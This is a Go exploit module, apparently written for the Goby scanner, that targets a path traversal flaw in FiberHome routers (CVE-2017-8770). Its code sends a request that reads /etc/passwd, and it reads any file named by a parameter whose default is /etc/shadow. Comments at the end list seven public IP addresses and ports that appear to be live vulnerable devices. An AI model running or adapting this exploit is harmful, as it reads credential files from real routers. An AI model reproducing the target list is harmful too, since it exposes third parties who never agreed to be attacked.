package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "FIBERHOME File Read (CVE-2017-8770)",
    "Description": "Hackers can obtain important files by this vulnerability",
    "Product": "FIBERHOME",
    "Homepage": "https://www.fiberhome.com/default.aspx",
    "DisclosureDate": "2021-06-02",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "(body=\"/html/skin/common.css\"||title=\"FIBERHOME\"||body=\"FIBERHOME Systems, Inc\"||title=\"HomeStation\")",
    "Level": "3",
    "Impact": "<p>Hackers can obtain important files by this vulnerability</p>",
    "Recommendation": "<p>1. The data entered by the user needs to be strictly filtered in the webpage code.</p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. Upgrade to the latest version.</p>",
    "References": [
        "https://www.exploit-db.com/exploits/42547/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "File",
            "type": "input",
            "value": "/etc/shadow"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "File Inclusion"
    ],
    "CVEIDs": [
        "CVE-2017-8770"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10475"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			cfg := httpclient.NewGetRequestConfig("/cgi-bin/webproc?getpage=../../../../etc/passwd&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:login=true&var:page=wizard")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ":/bin/sh") && strings.Contains(resp.Utf8Html, "root:")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["File"].(string)
			//httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			uri := fmt.Sprintf("/cgi-bin/webproc?getpage=../../../..%s&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:login=true&var:page=wizard", cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}

// 179.100.79.154:8000
// 187.57.140.127:8000
// 177.68.166.118:8000
// 177.68.244.39:8000
// 177.95.195.106:8000
// 152.250.106.160:8000
// 200.161.173.184:8000
